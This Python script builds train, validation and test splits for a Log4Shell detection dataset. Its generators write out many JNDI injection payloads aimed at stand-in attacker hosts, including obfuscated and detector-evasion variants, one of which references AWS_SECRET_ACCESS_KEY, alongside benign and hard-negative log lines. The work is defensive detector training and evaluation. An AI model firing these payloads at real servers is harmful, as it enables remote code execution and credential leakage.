#!/usr/bin/env python3
"""Build the product-level Log4Shell dataset splits."""

from __future__ import annotations

import argparse
import base64
import csv
import json
import random
import shutil
import subprocess
from collections import Counter
from datetime import date
from pathlib import Path
from urllib.parse import quote

try:
    import _bootstrap  # noqa: F401
except ModuleNotFoundError:  # pragma: no cover
    from scripts import _bootstrap  # noqa: F401
import pandas as pd

from detector.canonicalizer import canonicalize
from detector.dataset import DATASET_SCHEMA
from detector.external_ingest import extract_log4shell_observation
from detector.paths import METADATA_DIR, PLOTS_DIR, PROCESSED_DATA_DIR, RAW_DATA_DIR, ensure_project_dirs

try:
    import matplotlib

    matplotlib.use("Agg")
    import matplotlib.pyplot as plt
except ImportError:  # pragma: no cover
    plt = None

try:
    import requests
except ImportError:  # pragma: no cover
    requests = None


TODAY = date.today().isoformat()
HOSTS = [
    "evil.example",
    "attacker.evil.com",
    "log4j-test.invalid",
    "callback.local",
    "probe.example.net",
    "lab-callback.example.org",
]
SAFE_EXAMPLE_HOSTS = [
    "docs.example",
    "training.local",
    "kb.internal",
    "sample.invalid",
    "playbook.local",
    "defensive-lab.example",
]
PATHS = ["/", "/home", "/api/products?id=123", "/login", "/search?q=boots", "/static/app.js", "/metrics"]
USER_AGENTS = [
    "Mozilla/5.0 Chrome/120.0",
    "Mozilla/5.0 Safari/605.1.15",
    "curl/7.88.1",
    "python-requests/2.31.0",
    "PostmanRuntime/7.36.1",
    "Java/11.0.13",
    "Go-http-client/1.1",
]
SPLIT_BY_OBFUSCATION = {
    "plain_jndi": "train",
    "ldap": "train",
    "rmi": "train",
    "dns": "train",
    "ldaps": "train",
    "simple_url_encoded": "train",
    "case_manipulation": "train",
    "header_payload": "val",
    "standard_variant": "test",
    "nested_lookup": "unseen_obfuscation_test",
    "env_fallback": "unseen_obfuscation_test",
    "fragmented_tokens": "unseen_obfuscation_test",
    "double_url_encoding": "unseen_obfuscation_test",
    "unicode_escape": "unseen_obfuscation_test",
    "mixed_separator": "unseen_obfuscation_test",
}
SPLUNK_LOG4SHELL_URL = "https://media.githubusercontent.com/media/splunk/attack_data/master/datasets/suspicious_behaviour/log4shell_exploitation/log4shell_correlation.log"
PAYLOADS_ALL_THE_THINGS_URL = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/CVE%20Exploits/Log4Shell.md"
ELASTIC_APACHE_LOGS_URL = "https://raw.githubusercontent.com/elastic/examples/master/Common%20Data%20Formats/apache_logs/apache_logs"
CURATED_INTEL_URLS = [
    "https://raw.githubusercontent.com/curated-intel/Log4Shell-IOCs/main/KPMG_Log4Shell_Feeds/MISP-CSV_MediumConfidence_Unfiltered/Log4j_URLHaus_ThreatHunt_Feed.csv",
    "https://raw.githubusercontent.com/curated-intel/Log4Shell-IOCs/main/ETAC_Log4Shell_Analysis/ETAC_Vetted_Log4Shell_IOCs.csv",
]
FOXIT_PCAP_URLS = [
    "https://raw.githubusercontent.com/fox-it/log4shell-pcaps/main/log4shell-ldap-pcaps/ldap-user-agent-ev0.pcap",
    "https://raw.githubusercontent.com/fox-it/log4shell-pcaps/main/log4shell-ldap-pcaps/ldap-uri-params-ev0.pcap",
    "https://raw.githubusercontent.com/fox-it/log4shell-pcaps/main/log4shell-rmi-pcaps/rmi-user-agent-ev0.pcap",
    "https://raw.githubusercontent.com/fox-it/log4shell-pcaps/main/log4shell-rmi-pcaps/rmi-uri-params-ev0.pcap",
    "https://raw.githubusercontent.com/fox-it/log4shell-pcaps/main/log4shell-rmi-pcaps/rmi-x-api-version-ev0.pcap",
]


def _multi_url_encode(payload: str, passes: int) -> str:
    encoded = payload
    for _ in range(passes):
        encoded = quote(encoded, safe="")
    return encoded


def _percent_u_encode(payload: str) -> str:
    return "".join(f"%u{ord(char):04X}" if char in "${}:/" else char for char in payload)


def _payloads() -> list[dict[str, str]]:
    payloads: list[dict[str, str]] = []
    for host in HOSTS:
        payloads.extend(
            [
                {"payload": f"${{jndi:ldap://{host}/a}}", "obfuscation_type": "plain_jndi"},
                {"payload": f"${{jndi:ldap://{host}/b}}", "obfuscation_type": "ldap"},
                {"payload": f"${{jndi:rmi://{host}/c}}", "obfuscation_type": "rmi"},
                {"payload": f"${{jndi:dns://{host}/d}}", "obfuscation_type": "dns"},
                {"payload": f"${{jndi:ldaps://{host}/e}}", "obfuscation_type": "ldaps"},
                {"payload": quote(f"${{jndi:ldap://{host}/enc}}", safe=""), "obfuscation_type": "simple_url_encoded"},
                {"payload": f"${{JnDi:LdAp://{host}/mixed}}", "obfuscation_type": "case_manipulation"},
                {"payload": f"${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{host}/nested}}", "obfuscation_type": "nested_lookup"},
                {"payload": f"${{${{lower:j}}${{lower:n}}${{lower:d}}${{lower:i}}:ldap://{host}/lower}}", "obfuscation_type": "nested_lookup"},
                {"payload": f"${{${{upper:j}}${{upper:n}}${{upper:d}}${{upper:i}}:ldap://{host}/upper}}", "obfuscation_type": "nested_lookup"},
                {"payload": f"${{${{env:AWS_SECRET_ACCESS_KEY:-j}}${{env:AWS_SECRET_ACCESS_KEY:-n}}${{env:AWS_SECRET_ACCESS_KEY:-d}}${{env:AWS_SECRET_ACCESS_KEY:-i}}:ldap://{host}/env}}", "obfuscation_type": "env_fallback"},
                {"payload": f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{host}/frag}}", "obfuscation_type": "fragmented_tokens"},
                {"payload": quote(quote(f"${{jndi:ldap://{host}/double}}", safe=""), safe=""), "obfuscation_type": "double_url_encoding"},
                {"payload": f"${{\\u006a\\u006e\\u0064\\u0069:ldap://{host}/unicode}}", "obfuscation_type": "unicode_escape"},
                {"payload": f"${{j${{::-n}}d${{::-i}}:l${{::-d}}ap://{host}/sep}}", "obfuscation_type": "mixed_separator"},
                {"payload": f"User-Agent: ${{jndi:ldap://{host}/header}}", "obfuscation_type": "header_payload"},
                {"payload": f"${{jndi:ldap://{host}/std}}", "obfuscation_type": "standard_variant"},
            ]
        )
    return payloads


def _adversarial_evasion_payloads() -> list[dict[str, str]]:
    """Payloads designed to evade simple/static regex signatures."""
    payloads: list[dict[str, str]] = []
    for host in HOSTS:
        train_specs = [
            (f"${{j\u200bndi:ldap://{host}/zw-j}}", "zero_width_jndi"),
            (f"${{jn\u200cdi:ldap://{host}/zw-n}}", "zero_width_jndi"),
            (f"${{ȷndi:ldap://{host}/latin-dotless-j}}", "homoglyph_jndi"),
            (f"${{jndі:ldap://{host}/cyrillic-i}}", "homoglyph_jndi"),
            (f"${{&#106;ndi:ldap://{host}/html-decimal}}", "html_entity_jndi"),
            (f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{host}/full-split}}", "lookup_character_concat"),
            (f"${{${{date:'j'}}ndi:ldap://{host}/date-j}}", "semantic_lookup_jndi"),
            (_multi_url_encode(f"${{jndi:ldap://{host}/triple-train}}", 3), "triple_url_encoded"),
        ]
        test_specs = [
            (f"${{jnd\u200di:ldap://{host}/zw-d}}", "zero_width_jndi"),
            (f"${{ϳndi:ldap://{host}/greek-j}}", "homoglyph_jndi"),
            (f"${{j\u200bn\u200cd\u200di:ldap://{host}/multi-zw}}", "zero_width_jndi"),
            (f"${{&#x6A;ndi:ldap://{host}/html-hex}}", "html_entity_jndi"),
            (f"${{${{date:'jn'}}di:ldap://{host}/date-jn}}", "semantic_lookup_jndi"),
            (f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}://{host}/full-rmi}}", "lookup_character_concat"),
            (_multi_url_encode(f"${{jndi:dns://{host}/triple-test}}", 3), "triple_url_encoded"),
            (f"${{jndi:\tldap://{host}/tab-protocol}}", "whitespace_injection"),
            (f"${{j${{/**/}}ndi:ldap://{host}/comment-token}}", "comment_injection"),
            (f"GET /api/v2/users/profile Cookie: session=${{jndi:ldap://{host}/embedded}} HTTP/1.1 Host: app.local Accept: text/html", "context_embedded_payload"),
            (f"X-Custom: ${{jndi X-Other: :ldap://{host}/split-field}}", "field_split_payload"),
        ]
        payloads.extend({"payload": payload, "obfuscation_type": obf, "split": "train"} for payload, obf in train_specs)
        payloads.extend({"payload": payload, "obfuscation_type": obf, "split": "adversarial_evasion_test"} for payload, obf in test_specs)
    return payloads


def _benign_templates() -> list[tuple[str, str]]:
    return [
        ("GET /home HTTP/1.1", "normal_web"),
        ("GET /api/products?id=123 HTTP/1.1", "normal_web"),
        ("POST /login HTTP/1.1 user=demo", "normal_web"),
        ("GET /docs/log4j-mitigation HTTP/1.1", "documentation"),
        ("User searched for Log4j mitigation guide", "keyword_only"),
        ("JNDI configuration loaded successfully for internal naming service", "keyword_only"),
        ("LDAP connection pool initialized for corporate directory", "keyword_only"),
        ("Developer opened Java Naming and Directory Interface documentation", "documentation"),
        ("Security scanner report mentions escaped example \\${jndi:ldap://example.com/a}", "escaped_payload"),
        ("Blog article about Log4Shell payloads was requested", "documentation"),
        ("Documentation page contains ${jndi:ldap://example.com} as escaped text", "documentation_example"),
    ]


def _apache_style_benign_log(sample_idx: int) -> str:
    ip = f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
    day = 10 + (sample_idx % 18)
    hour = sample_idx % 24
    minute = (sample_idx * 7) % 60
    second = (sample_idx * 13) % 60
    path = random.choice(
        [
            "/",
            "/index.html",
            "/static/app.js",
            "/static/style.css",
            "/images/logo.png",
            "/api/products?id=123",
            "/presentations/logstash-monitorama-2013/images/kibana-search.png",
            "/presentations/logstash-monitorama-2013/images/kibana-dashboard3.png",
            "/blog/security-hardening",
            "/docs/logging-best-practices",
        ]
    )
    status = random.choice([200, 200, 200, 301, 304, 404])
    size = random.randint(128, 240000)
    referer = random.choice(["-", "https://example.com/", "https://semicomplete.com/presentations/logstash-monitorama-2013/"])
    user_agent = random.choice(USER_AGENTS + ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 Chrome/32.0 Safari/537.36"])
    return (
        f'{ip} - - [{day:02d}/May/2015:{hour:02d}:{minute:02d}:{second:02d} +0000] '
        f'"GET {path} HTTP/1.1" {status} {size} "{referer}" "{user_agent}"'
    )


def _hard_negative_variants() -> list[tuple[str, str]]:
    """Benign rows that contain payload-like text in non-runtime contexts."""
    rows: list[tuple[str, str]] = []
    for host in SAFE_EXAMPLE_HOSTS:
        payload = f"${{jndi:ldap://{host}/sample}}"
        escaped_payload = f"\\${{jndi:ldap://{host}/escaped}}"
        encoded_payload = quote(payload, safe="")
        double_encoded_payload = _multi_url_encode(payload, 2)
        percent_u_payload = _percent_u_encode(payload)
        html_entity_payload = (
            payload.replace("$", "&#36;")
            .replace("{", "&#123;")
            .replace("}", "&#125;")
            .replace(":", "&#58;")
            .replace("/", "&#47;")
        )
        base64_payload = base64.b64encode(payload.encode("utf-8")).decode("ascii")
        rows.extend(
            [
                (
                    f"GET /docs/search?q={encoded_payload}&purpose=defensive-note HTTP/1.1 Host: docs.local",
                    "benign_encoded_search_query",
                ),
                (
                    f"GET /kb/log4shell?sample={double_encoded_payload}&display=literal HTTP/1.1 Host: kb.local",
                    "benign_encoded_documentation",
                ),
                (
                    f"GET /wiki/log4j?sample={percent_u_payload}&view=copyable-text HTTP/1.1 Host: training.local",
                    "benign_percent_u_documentation",
                ),
                (
                    f"INFO markdown_code_block value='{payload}' render_context=documentation_only",
                    "benign_documentation_example",
                ),
                (
                    f"INFO escaped_code_sample value='{escaped_payload}' source=developer_guide",
                    "benign_json_escaped_payload",
                ),
                (
                    f"DEBUG artifact payload_b64={base64_payload} action=store_sample decode_at_runtime=false",
                    "benign_base64_artifact",
                ),
                (
                    f"ASSERT literal_payload_string equals '{payload}' suite=parser_documentation mode=no_eval",
                    "benign_unit_test_fixture",
                ),
                (
                    f"SECURITY_REVIEW indicator_sample='{payload}' origin=threat_report status=not_seen_in_request",
                    "benign_scanner_report",
                ),
                (
                    f"TRAINING note tokens '$' '{{' 'jndi' ':ldap://' '{host}' are shown separately for awareness",
                    "benign_fragmented_tutorial_text",
                ),
                (
                    f"GET /preview?html={html_entity_payload}&escaped=true HTTP/1.1 Host: cms.local",
                    "benign_html_entity_documentation",
                ),
                (
                    f"INFO json_template={{\"example\":\"\\\\${{jndi:ldap://{host}/json}}\",\"literal\":true}}",
                    "benign_json_escaped_payload",
                ),
                (
                    "WARN log4j notes mention JNDI, LDAP, RMI, and lookup syntax as separate documentation terms",
                    "benign_keyword_only",
                ),
            ]
        )
    return rows


def _make_log(payload: str, field: str) -> str:
    ua = random.choice(USER_AGENTS)
    path = random.choice(PATHS)
    if field == "minimal_query":
        return f"GET /?q={payload} HTTP/1.1"
    if field == "uri_param":
        return f"GET /api/check?debug={payload} HTTP/1.1 Host: app.local"
    if field == "user_agent":
        return f"Request from User-Agent: {payload} | Method: GET | Host: app.local | Path: {path}"
    if field == "user_agent_minimal":
        return f"Request from User-Agent: {payload}"
    if field == "x_api_version":
        return f"Request from User-Agent: {ua} | Method: GET | Host: app.local | Path: {path} | X-Api-Version: {payload}"
    if field == "path":
        return f"GET /search?q={payload} HTTP/1.1 Host: app.local User-Agent: {ua}"
    if field == "body":
        return f"POST /search HTTP/1.1 Host: app.local Body: query={payload}"
    return payload


def _record(
    idx: int,
    source: str,
    raw_log: str,
    label: int,
    attack_family: str,
    field: str,
    split: str,
    risk_level: str,
    obfuscation_override: str | None = None,
) -> dict[str, object]:
    canonical = canonicalize(raw_log)
    obfuscation_type = obfuscation_override or (canonical.obfuscation_type if label else attack_family)
    return {
        "id": f"LS-{idx:06d}",
        "timestamp": TODAY,
        "source": source,
        "raw_log": raw_log,
        "normalized_log": canonical.normalized_log,
        "label": int(label),
        "attack_family": attack_family if label else "benign",
        "obfuscation_type": obfuscation_type,
        "field": field,
        "split": split,
        "risk_level": risk_level,
    }


def _download_lines(url: str, timeout: int = 8) -> list[str]:
    if requests is None:
        return []
    try:
        response = requests.get(url, timeout=timeout)
        response.raise_for_status()
    except Exception:
        return []
    return response.text.splitlines()


def _download_bytes(url: str, timeout: int = 20) -> bytes | None:
    if requests is None:
        return None
    try:
        response = requests.get(url, timeout=timeout)
        response.raise_for_status()
    except Exception:
        return None
    return response.content


def _extract_payload_lines(lines: list[str], limit: int = 80) -> list[str]:
    candidates: list[str] = []
    for line in lines:
        observation = extract_log4shell_observation(line)
        if observation and observation not in candidates:
            candidates.append(observation)
        if len(candidates) >= limit:
            break
    return candidates


def _payload_corpus_rows(start_idx: int, fetch_external: bool) -> tuple[list[dict[str, object]], dict[str, object]]:
    fallback = [
        "Request from User-Agent: ${jndi:ldap://${java:version}.payload-corpus.example/a} | Method: GET | Host: corpus | Path: /",
        "Request from User-Agent: ${jndi:dns://${hostName}.payload-corpus.example} | Method: GET | Host: corpus | Path: /",
        "GET /?q=${jndi:ldap://${env:JAVA_VERSION}.payload-corpus.example/a} HTTP/1.1",
    ]
    lines = _download_lines(PAYLOADS_ALL_THE_THINGS_URL, timeout=10) if fetch_external else []
    observations = _extract_payload_lines(lines, limit=40) or fallback
    rows = []
    idx = start_idx
    source = "payloadsallthethings" if observations != fallback else "payloadsallthethings_fallback"
    for observation in observations[:40]:
        idx += 1
        rows.append(_record(idx, source, observation, 1, "log4shell", "payload_corpus", "unseen_obfuscation_test", "critical"))
    meta = {
        "url": PAYLOADS_ALL_THE_THINGS_URL,
        "rows": len(rows),
        "used_fallback": observations == fallback,
        "role": "Payload taxonomy and unseen-obfuscation expansion, not training data.",
    }
    return rows, meta


def _curated_intel_meta(fetch_external: bool) -> dict[str, object]:
    sources = []
    for url in CURATED_INTEL_URLS:
        lines = _download_lines(url, timeout=10) if fetch_external else []
        indicators = [line.strip() for line in lines if line.strip() and not line.lower().startswith(("uuid", "event", "type"))]
        sources.append({"url": url, "rows": len(lines), "indicator_preview": indicators[:5]})
    return {
        "role": "Callback-host and indicator context only; not treated as labeled HTTP access-log rows.",
        "sources": sources,
    }


def _extract_foxit_pcap_lines(fetch_external: bool, limit: int = 40) -> tuple[list[str], dict[str, object]]:
    meta: dict[str, object] = {"urls": FOXIT_PCAP_URLS, "rows": 0, "used_fallback": True, "reason": ""}
    tshark = shutil.which("tshark")
    if not tshark:
        meta["reason"] = "tshark unavailable"
        return [], meta

    output: list[str] = []
    raw_dir = RAW_DATA_DIR / "foxit_pcaps"
    raw_dir.mkdir(parents=True, exist_ok=True)
    for url in FOXIT_PCAP_URLS:
        pcap_path = raw_dir / Path(url).name
        if not pcap_path.exists() or pcap_path.stat().st_size < 64:
            if not fetch_external:
                continue
            data = _download_bytes(url)
            if not data:
                continue
            pcap_path.write_bytes(data)
        cmd = [
            tshark,
            "-r",
            str(pcap_path),
            "-Y",
            "http.request",
            "-T",
            "fields",
            "-e",
            "frame.time",
            "-e",
            "ip.src",
            "-e",
            "http.request.method",
            "-e",
            "http.host",
            "-e",
            "http.request.uri",
            "-e",
            "http.user_agent",
        ]
        try:
            completed = subprocess.run(cmd, check=True, text=True, capture_output=True)
        except Exception as exc:
            meta["reason"] = f"tshark extraction failed: {exc}"
            continue
        for line in completed.stdout.splitlines():
            frame_time, ip_src, method, host, uri, ua = (line.split("\t") + [""] * 6)[:6]
            raw = f"Request from {ip_src} User-Agent: {ua} | Method: {method} | Host: {host} | Path: {uri}"
            observation = extract_log4shell_observation(raw)
            if observation and observation not in output:
                output.append(raw)
            if len(output) >= limit:
                break
        if len(output) >= limit:
            break
    meta["rows"] = len(output)
    meta["used_fallback"] = not output
    if output:
        meta["reason"] = "extracted with tshark"
    elif not fetch_external:
        meta["reason"] = "external fetching disabled and no local PCAP rows extracted"
    return output, meta


def _external_rows(start_idx: int, fetch_external: bool) -> tuple[list[dict[str, object]], dict[str, object]]:
    idx = start_idx
    rows: list[dict[str, object]] = []
    source_meta: dict[str, object] = {"fetch_external": fetch_external, "sources": {}}
    external_specs = [
        (
            "external_greedybear_test",
            "honeynet_log4shell",
            [
                "https://raw.githubusercontent.com/honeynet/log4shell-data/main/logstash_raw.csv",
                "https://raw.githubusercontent.com/honeynet/log4shell-data/main/logstash_raw_2.csv",
                "https://raw.githubusercontent.com/honeynet/log4shell-data/main/logstash_raw_3.csv",
            ],
            ["${jndi:ldap://honeynet.example/a}", "${${lower:j}ndi:rmi://honeynet.example/b}"],
        ),
        (
            "external_splunk_test",
            "splunk_attack_data",
            [SPLUNK_LOG4SHELL_URL],
            ["GET / HTTP/1.1 User-Agent=${jndi:ldap://splunk.example/a}"],
        ),
    ]
    for split, source, urls, fallback in external_specs:
        lines: list[str] = []
        if fetch_external:
            for url in urls:
                lines.extend(_download_lines(url))
        payload_lines = _extract_payload_lines(lines, limit=60) or fallback
        actual_source = source if payload_lines != fallback else f"{source}_fallback"
        source_meta["sources"][split] = {"source": actual_source, "urls": urls, "rows": len(payload_lines), "used_fallback": payload_lines == fallback}
        for line in payload_lines[:60]:
            idx += 1
            rows.append(_record(idx, actual_source, line, 1, "log4shell", "external", split, "critical"))

    foxit_fallback = ["Request from User-Agent: ${jndi:ldaps://foxit.example/a} | Method: GET | Host: victim | Path: /"]
    foxit_lines, foxit_meta = _extract_foxit_pcap_lines(fetch_external)
    foxit_payload_lines = foxit_lines or foxit_fallback
    source_meta["sources"]["external_foxit_pcap_test"] = {
        "source": "foxit_pcap_http" if foxit_lines else "foxit_pcap_http_fallback",
        **foxit_meta,
    }
    for line in foxit_payload_lines[:60]:
        idx += 1
        rows.append(
            _record(
                idx,
                "foxit_pcap_http" if foxit_lines else "foxit_pcap_http_fallback",
                line,
                1,
                "log4shell",
                "pcap_http",
                "external_foxit_pcap_test",
                "critical",
            )
        )
    benign_lines = _download_lines(ELASTIC_APACHE_LOGS_URL, timeout=12) if fetch_external else []
    benign_candidates: list[str] = []
    for line in benign_lines:
        stripped = line.strip()
        if not stripped:
            continue
        canonical = canonicalize(stripped)
        if canonical.canonical_signal["has_jndi"]:
            continue
        if stripped not in benign_candidates:
            benign_candidates.append(stripped)
        if len(benign_candidates) >= 200:
            break
    benign_fallback = [
        "127.0.0.1 - - [17/May/2015:10:05:03 +0000] \"GET /index.html HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0\"",
        "127.0.0.1 - - [17/May/2015:10:05:43 +0000] \"GET /static/app.js HTTP/1.1\" 200 2048 \"-\" \"Mozilla/5.0\"",
    ]
    benign_payload_lines = benign_candidates or benign_fallback
    benign_source = "elastic_apache_access_logs" if benign_candidates else "elastic_apache_access_logs_fallback"
    source_meta["sources"]["external_benign_web_test"] = {
        "source": benign_source,
        "url": ELASTIC_APACHE_LOGS_URL,
        "rows": len(benign_payload_lines),
        "used_fallback": not benign_candidates,
        "role": "Public benign Apache access logs used for supplementary external false-positive checks.",
    }
    for line in benign_payload_lines:
        idx += 1
        rows.append(_record(idx, benign_source, line, 0, "benign", "external_benign_web_log", "external_benign_web_test", "low"))
    return rows, source_meta


def build_dataset(samples_per_family: int = 12, seed: int = 42, fetch_external: bool = True) -> pd.DataFrame:
    ensure_project_dirs()
    random.seed(seed)
    idx = 0
    rows: list[dict[str, object]] = []
    fields = ["minimal_query", "uri_param", "user_agent", "user_agent_minimal", "x_api_version", "path", "body"]

    for payload_spec in _payloads():
        split = SPLIT_BY_OBFUSCATION[payload_spec["obfuscation_type"]]
        for sample_idx in range(samples_per_family):
            idx += 1
            field = fields[sample_idx % len(fields)]
            raw_log = _make_log(payload_spec["payload"], field)
            rows.append(_record(idx, "synthetic", raw_log, 1, "log4shell", field, split, "critical"))

    for payload_spec in _adversarial_evasion_payloads():
        for sample_idx in range(samples_per_family):
            idx += 1
            field = "context" if payload_spec["obfuscation_type"] in {"context_embedded_payload", "field_split_payload"} else fields[sample_idx % len(fields)]
            raw_log = payload_spec["payload"] if field == "context" else _make_log(payload_spec["payload"], field)
            rows.append(
                _record(
                    idx,
                    "adversarial_evasion",
                    raw_log,
                    1,
                    "log4shell",
                    field,
                    payload_spec["split"],
                    "critical",
                    obfuscation_override=payload_spec["obfuscation_type"],
                )
            )

    benign = _benign_templates()
    normal_benign = [item for item in benign if item[1] in {"normal_web", "documentation"}]
    hard_benign = [item for item in benign if item[1] not in {"normal_web"}] + _hard_negative_variants()
    for split, count in [("train", 220), ("val", 70), ("test", 90), ("blind_manual_test", 20)]:
        for _ in range(count):
            idx += 1
            raw_log, family = random.choice(normal_benign)
            rows.append(_record(idx, "benign_logs", raw_log, 0, family, "mixed", split, "low"))

    for split, count in [("train", 360), ("val", 120), ("test", 120), ("blind_manual_test", 40)]:
        for sample_idx in range(count):
            idx += 1
            raw_log = _apache_style_benign_log(sample_idx)
            rows.append(_record(idx, "benign_apache_format", raw_log, 0, "benign", "external_like_benign_access_log", split, "low"))

    for split, count in [("train", 360), ("val", 160), ("hard_negative_test", 180), ("blind_manual_test", 20)]:
        for sample_idx in range(count):
            idx += 1
            raw_log, family = random.choice(hard_benign)
            raw_log = f"{raw_log} trace_id=hardneg-{split}-{sample_idx:04d}"
            rows.append(_record(idx, "hard_negative", raw_log, 0, family, "mixed", split, "low"))

    blind_payloads = [
        "GET /?q=${jndi:ldap://blind.example/a} HTTP/1.1",
        "GET /?q=%24%7Bjndi%3Armi%3A%2F%2Fblind.example%2Fa%7D HTTP/1.1",
        "Request from User-Agent: ${${lower:j}${lower:n}${lower:d}${lower:i}:dns://blind.example/a}",
        "GET /?q=${${::-j}${::-n}${::-d}${::-i}:ldap://blind.example/a} HTTP/1.1",
    ]
    for raw_log in blind_payloads:
        idx += 1
        rows.append(_record(idx, "blind_manual", raw_log, 1, "log4shell", "mixed", "blind_manual_test", "critical"))

    payload_corpus_rows, payload_corpus_meta = _payload_corpus_rows(idx, fetch_external=fetch_external)
    rows.extend(payload_corpus_rows)
    idx += len(payload_corpus_rows)
    external_rows, source_meta = _external_rows(idx, fetch_external=fetch_external)
    source_meta["sources"]["payloadsallthethings"] = payload_corpus_meta
    source_meta["sources"]["curatedintel_log4shell_iocs"] = _curated_intel_meta(fetch_external)
    rows.extend(external_rows)
    df = pd.DataFrame(rows, columns=DATASET_SCHEMA)
    _write_outputs(df, source_meta)
    return df


def _write_outputs(df: pd.DataFrame, source_meta: dict[str, object]) -> None:
    split_to_file = {
        "train": "train.csv",
        "val": "val.csv",
        "test": "test.csv",
        "unseen_obfuscation_test": "unseen_obfuscation_test.csv",
        "adversarial_evasion_test": "adversarial_evasion_test.csv",
        "hard_negative_test": "hard_negative_test.csv",
        "external_greedybear_test": "external_greedybear_test.csv",
        "external_splunk_test": "external_splunk_test.csv",
        "external_foxit_pcap_test": "external_foxit_pcap_test.csv",
        "external_benign_web_test": "external_benign_web_test.csv",
        "blind_manual_test": "blind_manual_test.csv",
    }
    for split, filename in split_to_file.items():
        subset = df[df["split"] == split].copy()
        subset.to_csv(PROCESSED_DATA_DIR / filename, index=False, quoting=csv.QUOTE_MINIMAL)

    split_strategy = {
        "train": ["plain_jndi", "ldap", "rmi", "dns", "ldaps", "simple_url_encoded", "case_manipulation", "hard_negatives", "benign_payload_contexts"],
        "validation": ["plain_jndi_different_hosts", "simple_header_payloads", "benign_validation", "hard_negative_threshold_calibration"],
        "test": ["standard_variants", "realistic_benign"],
        "unseen_obfuscation_test": ["nested_lookup", "env_fallback", "fragmented_tokens", "double_url_encoding", "unicode_escape", "mixed_separator"],
        "adversarial_evasion_test": ["zero_width_jndi", "homoglyph_jndi", "triple_url_encoded", "html_entity_jndi", "semantic_lookup_jndi", "lookup_character_concat", "context_embedded_payload"],
        "external_tests": ["greedybear_or_honeynet_log4pot", "splunk_log4shell", "foxit_pcap_http", "elastic_apache_access_logs"],
    }
    taxonomy = {
        "plain_jndi": "Canonical ${jndi:protocol://host/path} payloads.",
        "simple_url_encoded": "Single URL encoding of lookup syntax.",
        "double_url_encoding": "Repeated URL encoding requiring multiple decode passes.",
        "nested_lookup": "Lower/upper lookup expressions nested inside the JNDI token or protocol.",
        "env_fallback": "Environment fallback syntax used to reconstruct characters.",
        "fragmented_tokens": "Default-value fragments such as ${::-j}${::-n}${::-d}${::-i}.",
        "unicode_escape": "Backslash-u escaped characters inside the payload.",
        "zero_width_jndi": "Invisible Unicode control characters inserted into the JNDI token.",
        "homoglyph_jndi": "Unicode lookalike characters replacing JNDI letters.",
        "html_entity_jndi": "HTML entity encoded JNDI characters.",
        "semantic_lookup_jndi": "Lookup expressions that reconstruct JNDI characters semantically.",
        "triple_url_encoded": "Three URL-encoding passes designed to evade shallow decoders.",
        "lookup_character_concat": "Every JNDI/protocol character is reconstructed through lookup fragments.",
        "context_embedded_payload": "Attack payload embedded inside a long benign-looking request context.",
        "hard_negative": "Benign lines that contain Log4Shell-related words or escaped examples.",
        "benign_encoded_search_query": "Encoded payload text used as a search or defensive research query.",
        "benign_encoded_documentation": "Double-encoded payload text displayed in documentation.",
        "benign_percent_u_documentation": "Percent-u encoded payload text shown as non-runtime documentation.",
        "benign_documentation_example": "Literal payload-like text shown inside documentation or markdown.",
        "benign_json_escaped_payload": "Escaped payload string stored as JSON or code-sample text.",
        "benign_base64_artifact": "Base64 payload artifact stored without runtime decoding.",
        "benign_unit_test_fixture": "Unit-test fixture containing a payload string as expected literal text.",
        "benign_scanner_report": "Threat-report indicator stored as evidence rather than executed input.",
        "benign_fragmented_tutorial_text": "Tutorial text showing payload tokens separately.",
        "benign_html_entity_documentation": "HTML-entity encoded payload displayed in a documentation preview.",
        "benign_keyword_only": "Security wording that mentions JNDI/LDAP/RMI terms without lookup execution.",
        "external_like_benign_access_log": "Synthetic Apache combined-log rows used to teach benign web-log format without using external test rows.",
        "external_benign_web_log": "Public benign Apache access log rows used for supplementary external false-positive checks.",
    }
    stats = {
        "total_rows": int(len(df)),
        "by_split": df["split"].value_counts().to_dict(),
        "by_label": {str(k): int(v) for k, v in df["label"].value_counts().to_dict().items()},
        "by_source": df["source"].value_counts().to_dict(),
        "by_obfuscation_type": df["obfuscation_type"].value_counts().to_dict(),
        "schema": DATASET_SCHEMA,
    }
    sources = {
        "synthetic": "Controlled Log4Shell payload variants generated by scripts/build_dataset.py.",
        "adversarial_evasion": "Malicious evasion probes designed to bypass simple/static regex signatures.",
        "hard_negative": "Benign documentation, search, configuration, and escaped payload examples.",
        "benign_apache_format": "Synthetic Apache combined-log rows used only in train/validation/standard test to reduce format-driven false positives.",
        "honeynet_log4shell": "Public Honeynet Log4Shell honeypot CSVs used as supplementary external malicious validation.",
        "honeynet_log4shell_fallback": "Curated Honeynet-style fallback examples used offline.",
        "splunk_attack_data": "Public Splunk attack_data Log4Shell simulation is used when reachable; curated fallback examples are used offline.",
        "foxit_pcap_http": "Fox-IT PCAP extraction is supported by scripts/extract_foxit_pcap.py; fallback examples keep the validation file reproducible offline.",
        "elastic_apache_access_logs": "Public benign Apache access logs used as supplementary external false-positive validation.",
        "external_fetch": source_meta,
    }
    for name, payload in [
        ("split_strategy.json", split_strategy),
        ("obfuscation_taxonomy.json", taxonomy),
        ("dataset_stats.json", stats),
        ("dataset_sources.json", sources),
    ]:
        with (METADATA_DIR / name).open("w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, sort_keys=True)
    _plot_stats(df)


def _plot_stats(df: pd.DataFrame) -> None:
    if plt is None:
        return
    PLOTS_DIR.mkdir(parents=True, exist_ok=True)
    split_counts = df.groupby(["split", "label"]).size().unstack(fill_value=0)
    ax = split_counts.plot(kind="bar", figsize=(11, 5), color=["#4C78A8", "#E45756"])
    ax.set_title("Dataset Distribution by Split")
    ax.set_xlabel("Split")
    ax.set_ylabel("Rows")
    ax.legend(["Benign", "Malicious"])
    plt.xticks(rotation=25, ha="right")
    plt.tight_layout()
    plt.savefig(PLOTS_DIR / "dataset_distribution.png", dpi=160)
    plt.close()

